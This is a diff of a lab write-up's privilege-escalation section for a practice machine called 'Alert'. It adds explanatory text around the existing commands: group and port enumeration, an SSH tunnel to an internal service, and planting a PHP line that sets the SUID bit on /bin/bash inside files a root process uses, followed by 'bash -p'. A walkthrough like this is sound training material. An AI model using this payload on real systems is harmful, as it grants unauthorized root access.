@@ -375,67 +375,79 @@
 
 ## Privilege Escalation
 
-``` bash
-albert@alert:~$ id
-uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)
-```
+!!! Tip "Privilege Escalation"
 
-``` bash
-albert@alert:~$ ss -tunlp
-Netid           State             Recv-Q            Send-Q                       Local Address:Port                       Peer Address:Port           Process           
-udp             UNCONN            0                 0                            127.0.0.53%lo:53                              0.0.0.0:*                                
-udp             UNCONN            0                 0                                  0.0.0.0:68                              0.0.0.0:*                                
-tcp             LISTEN            0                 4096                             127.0.0.1:8080                            0.0.0.0:*                                
-tcp             LISTEN            0                 4096                         127.0.0.53%lo:53                              0.0.0.0:*                                
-tcp             LISTEN            0                 128                                0.0.0.0:22                              0.0.0.0:*                                
-tcp             LISTEN            0                 511                                      *:80                                    *:*                                
-tcp             LISTEN            0                 128                                   [::]:22                                 [::]:*                                
-```
+    We can see that the user is added to the management group.
 
-``` bash
-ssh albert@alert.htb -L 8080:127.0.0.1:8080
-```
+    ``` bash
+    albert@alert:~$ id
+    uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)
+    ```
 
-``` bash
-albert@alert:~$ find / -group management 2>/dev/null
-/opt/website-monitor/config
-/opt/website-monitor/config/configuration.php
-```
+    We can see that an internal page is running on port 8080.
 
-``` bash
-albert@alert:/opt/website-monitor$ ls -lah
-total 96K
-drwxrwxr-x 7 root root       4.0K Oct 12  2024 .
-drwxr-xr-x 4 root root       4.0K Oct 12  2024 ..
-drwxrwxr-x 2 root management 4.0K Oct 12  2024 config
-drwxrwxr-x 8 root root       4.0K Oct 12  2024 .git
-drwxrwxr-x 2 root root       4.0K Oct 12  2024 incidents
--rwxrwxr-x 1 root root       5.2K Oct 12  2024 index.php
--rwxrwxr-x 1 root root       1.1K Oct 12  2024 LICENSE
--rwxrwxr-x 1 root root       1.5K Oct 12  2024 monitor.php
-drwxrwxrwx 2 root root       4.0K Oct 12  2024 monitors
--rwxrwxr-x 1 root root        104 Oct 12  2024 monitors.json
--rwxrwxr-x 1 root root        40K Oct 12  2024 Parsedown.php
--rwxrwxr-x 1 root root       1.7K Oct 12  2024 README.md
--rwxrwxr-x 1 root root       1.9K Oct 12  2024 style.css
-drwxrwxr-x 2 root root       4.0K Oct 12  2024 updates
-```
+    ``` bash
+    albert@alert:~$ ss -tunlp
+    Netid           State             Recv-Q            Send-Q                       Local Address:Port                       Peer Address:Port           Process           
+    udp             UNCONN            0                 0                            127.0.0.53%lo:53                              0.0.0.0:*                                
+    udp             UNCONN            0                 0                                  0.0.0.0:68                              0.0.0.0:*                                
+    tcp             LISTEN            0                 4096                             127.0.0.1:8080                            0.0.0.0:*                                
+    tcp             LISTEN            0                 4096                         127.0.0.53%lo:53                              0.0.0.0:*                                
+    tcp             LISTEN            0                 128                                0.0.0.0:22                              0.0.0.0:*                                
+    tcp             LISTEN            0                 511                                      *:80                                    *:*                                
+    tcp             LISTEN            0                 128                                   [::]:22                                 [::]:*                                
+    ```
 
-``` bash
-albert@alert:/opt/website-monitor$ ps -faux | grep monitor
-root         988  0.0  0.0   2636   732 ?        S    11:00   0:00  |           \_ inotifywait -m -e modify --format %w%f %e /opt/website-monitor/config
-root         973  0.0  0.6 206768 24172 ?        Ss   11:00   0:00 /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor
-albert      1437  0.0  0.0   6432   712 pts/0    S+   11:09   0:00              \_ grep --color=auto monitor
-```
+    We can see the internal page runing on port 8080 on my computer.
 
-``` php title="/opt/website-monitor/monitors/tets.php"
-<?php system("chmod u+s /bin/bash"); ?>
-``` 
+    ``` bash
+    ssh albert@alert.htb -L 8080:127.0.0.1:8080
+    ```
 
-``` php title="/opt/website-monitor/config/configuration.php"
-<?php system("chmod u+s /bin/bash"); ?>
-``` 
+    Since the user albert is part of the management group we can look for files or directories that belongs to the management group.
 
-``` php
-bash -p
-``` 
+    ``` bash
+    albert@alert:~$ find / -group management 2>/dev/null
+    /opt/website-monitor/config
+    /opt/website-monitor/config/configuration.php
+    ```
+
+    
+
+    ``` bash
+    albert@alert:/opt/website-monitor$ ls -lah
+    total 96K
+    drwxrwxr-x 7 root root       4.0K Oct 12  2024 .
+    drwxr-xr-x 4 root root       4.0K Oct 12  2024 ..
+    drwxrwxr-x 2 root management 4.0K Oct 12  2024 config
+    drwxrwxr-x 8 root root       4.0K Oct 12  2024 .git
+    drwxrwxr-x 2 root root       4.0K Oct 12  2024 incidents
+    -rwxrwxr-x 1 root root       5.2K Oct 12  2024 index.php
+    -rwxrwxr-x 1 root root       1.1K Oct 12  2024 LICENSE
+    -rwxrwxr-x 1 root root       1.5K Oct 12  2024 monitor.php
+    drwxrwxrwx 2 root root       4.0K Oct 12  2024 monitors
+    -rwxrwxr-x 1 root root        104 Oct 12  2024 monitors.json
+    -rwxrwxr-x 1 root root        40K Oct 12  2024 Parsedown.php
+    -rwxrwxr-x 1 root root       1.7K Oct 12  2024 README.md
+    -rwxrwxr-x 1 root root       1.9K Oct 12  2024 style.css
+    drwxrwxr-x 2 root root       4.0K Oct 12  2024 updates
+    ```
+
+    ``` bash
+    albert@alert:/opt/website-monitor$ ps -faux | grep monitor
+    root         988  0.0  0.0   2636   732 ?        S    11:00   0:00  |           \_ inotifywait -m -e modify --format %w%f %e /opt/website-monitor/config
+    root         973  0.0  0.6 206768 24172 ?        Ss   11:00   0:00 /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor
+    albert      1437  0.0  0.0   6432   712 pts/0    S+   11:09   0:00              \_ grep --color=auto monitor
+    ```
+
+    ``` php title="/opt/website-monitor/monitors/tets.php"
+    <?php system("chmod u+s /bin/bash"); ?>
+    ``` 
+
+    ``` php title="/opt/website-monitor/config/configuration.php"
+    <?php system("chmod u+s /bin/bash"); ?>
+    ``` 
+
+    ``` php
+    bash -p
+    ``` 
